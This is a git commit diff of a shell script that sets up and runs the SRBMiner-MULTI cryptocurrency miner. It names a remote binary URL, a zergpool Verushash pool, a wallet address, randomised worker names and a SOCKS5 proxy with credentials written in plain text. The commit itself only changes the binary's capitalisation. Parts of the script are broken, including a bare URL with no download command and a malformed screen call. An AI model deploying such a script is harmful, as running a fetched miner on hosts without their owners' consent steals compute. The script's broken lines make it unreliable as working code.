225c6d57a7a009dcb799dfa3baf6117be4bf2bf5
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-15 11:10:01 +0100

    Update bbt.sh

--- bbt.sh
+++ bbt.sh
@@ -4,11 +4,11 @@ sudo apt update
 sudo apt install screen -y
 sudo apt install screen libjansson4 -y
 https://github.com/fsinclai/vrsc-mine/raw/main/SRBMiner-MULTI
-cd SRBMiner-Multi
-chmod +x  SRBMiner-Multi
+cd SRBMiner-MULTI
+chmod +x  SRBMiner-MULTI
 screen -dmS ls
 POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
 WALLET=DRAydrbsfj8gHhBQygndwyB3fxP4qD6eEb
 PY=socks5://qwehsyfs:w1uyert4fs@78.46.89.24:45265
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-RAVZ)
-./SRBMiner-Multi --algorithm verushash --pool $POOL --wallet $WALLET.$WORKER -p c=DOGE 
+./SRBMiner-MULTI --algorithm verushash --pool $POOL --wallet $WALLET.$WORKER -p c=DOGE 
